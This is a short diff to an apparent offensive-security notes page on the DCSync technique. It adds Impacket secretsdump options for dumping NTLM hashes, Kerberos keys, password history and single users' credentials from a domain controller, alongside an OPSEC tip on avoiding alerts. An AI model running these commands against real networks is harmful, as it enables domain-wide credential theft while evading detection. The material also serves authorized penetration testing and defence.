@@ -39,6 +39,14 @@ DCSync is a technique used by attackers to obtain sensitive information, includi
 - DCSync Using Impacket Secretsdump
   ```bash
   secretsdump.py -outputfile <outfile> -just-dc <domain/user>@<dc ip> 
+  
+  # Useful Options
+  -just-dc # Extracts NTLM hashes and Kerberos keys
+  -just-dc-ntlm # Just dump NTLM hashes
+  -just-dc-user <username> # Extract only a specific user
+  -pwd-last-set # See when the users last changed their password
+  -history # Dump their password history as well
+  -user-status # See if a user is disabled
   ```
 > :warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.
 
